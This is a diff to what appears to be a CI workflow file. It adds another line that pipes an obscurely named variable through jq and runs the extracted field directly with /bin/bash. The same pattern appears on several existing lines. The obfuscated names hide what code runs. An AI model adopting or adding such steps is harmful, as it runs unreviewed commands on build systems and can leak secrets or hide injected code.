@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$gml89" | jq -r .iswb0034 | /bin/bash
           printf '%s' "$u2264" | jq -r .js59 | /bin/bash
           printf '%s' "$lwnad35013" | jq -r .zjg75 | /bin/bash
+          printf '%s' "$us341" | jq -r .hrpk35 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
